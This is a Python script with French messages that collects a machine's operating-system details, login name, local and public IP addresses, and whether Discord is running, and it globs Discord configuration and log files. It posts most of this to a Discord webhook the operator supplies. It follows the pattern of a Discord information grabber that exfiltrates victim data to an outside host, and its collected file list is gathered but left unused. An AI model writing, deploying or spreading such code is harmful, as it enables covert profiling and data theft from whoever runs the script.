import requests
import socket
import platform
import psutil
import os
import json
import glob
import subprocess

def get_public_ip():
    try:
        response = requests.get("https://httpbin.org/ip")
        public_ip = response.json()["origin"]
        return public_ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'IP publique: {e}")
        return None

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'IP locale: {e}")
        return None

def get_system_info():
    try:
        info = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
        return info
    except Exception as e:
        print(f"Erreur lors de la récupération des informations système: {e}")
        return None

def get_user_info():
    try:
        user_info = {
            "username": os.getlogin(),
            "fullname": None,
            "email": None
        }
        return user_info
    except Exception as e:
        print(f"Erreur lors de la récupération des informations utilisateur: {e}")
        return None

def get_discord_info():
    discord_info = {
        "process_running": False,
        "config_files": [],
        "log_files": []
    }
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if 'discord' in proc.info['name'].lower():
                discord_info["process_running"] = True
                break
        
        if platform.system() == "Windows":
            local_appdata = os.getenv('LOCALAPPDATA')
            discord_info["config_files"] = glob.glob(f"{local_appdata}\\Discord\\**\\*.json", recursive=True)
            discord_info["log_files"] = glob.glob(f"{local_appdata}\\Discord\\logs\\*.log")
        elif platform.system() == "Linux":
            discord_info["config_files"] = glob.glob(os.path.expanduser("~/.config/discord/**/*.json"), recursive=True)
            discord_info["log_files"] = glob.glob(os.path.expanduser("~/.config/discord/logs/*.log"))
        elif platform.system() == "Darwin":
            discord_info["config_files"] = glob.glob(os.path.expanduser("~/Library/Application Support/discord/**/*.json"), recursive=True)
            discord_info["log_files"] = glob.glob(os.path.expanduser("~/Library/Application Support/discord/logs/*.log"))
    except Exception as e:
        print(f"Erreur lors de la récupération des informations Discord: {e}")
    
    return discord_info

def send_info_to_discord(webhook_url, system_info, user_info, local_ip, public_ip, discord_info):
    data = {
        "content": (
            f"**Informations Système**\n"
            f"Systeme: {system_info['system']}\n"
            f"Node: {system_info['node']}\n"
            f"Release: {system_info['release']}\n"
            f"Version: {system_info['version']}\n"
            f"Machine: {system_info['machine']}\n"
            f"Processeur: {system_info['processor']}\n\n"
            
            f"**Informations Utilisateur**\n"
            f"Nom d'utilisateur: {user_info['username']}\n"
            f"Nom complet: {user_info['fullname']}\n"
            f"Email: {user_info['email']}\n\n"
            
            f"**Adresse IP**\n"
            f"IP Locale: {local_ip}\n"
            f"IP Publique: {public_ip}\n\n"
            
            f"**Informations Discord**\n"
            f"Discord en cours d'exécution: {'Oui' if discord_info['process_running'] else 'Non'}\n" +
            f"Fichiers de configuration:\n"
        )
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Informations envoyées avec succès au webhook Discord.")
        else:
            print(f"Erreur lors de l'envoi des informations: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Erreur lors de la requête au webhook Discord: {e}")

def send_info_to_discord2(webhook_url, system_info, user_info, local_ip, public_ip, discord_info):
    data = {
        "content": (
            f"**Informations Système**\n"
            f"Systeme: {system_info['system']}\n"
            f"Node: {system_info['node']}\n"
            f"Release: {system_info['release']}\n"
            f"Version: {system_info['version']}\n"
            f"Machine: {system_info['machine']}\n"
            f"Processeur: {system_info['processor']}\n\n"
            f"**Informations Utilisateur**\n"
            f"Nom d'utilisateur: {user_info['username']}\n"
            f"Nom complet: {user_info['fullname']}\n"
            f"Email: {user_info['email']}\n\n"
        )
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Informations envoyées avec succès au webhook Discord.²")
        else:
            print(f"Erreur lors de l'envoi des informations²: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Erreur lors de la requête au webhook Discord²: {e}")


if __name__ == "__main__":
    webhook_url = ""  # Remplacer par votre webhook Discord
    
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    system_info = get_system_info()
    user_info = get_user_info()
    discord_info = get_discord_info()
    
    if local_ip and public_ip and system_info and user_info and discord_info:
        send_info_to_discord(webhook_url, system_info, user_info, local_ip, public_ip, discord_info)
        send_info_to_discord2(webhook_url, system_info, user_info, local_ip, public_ip, discord_info)
    else:
        print("Impossible de récupérer toutes les informations.")
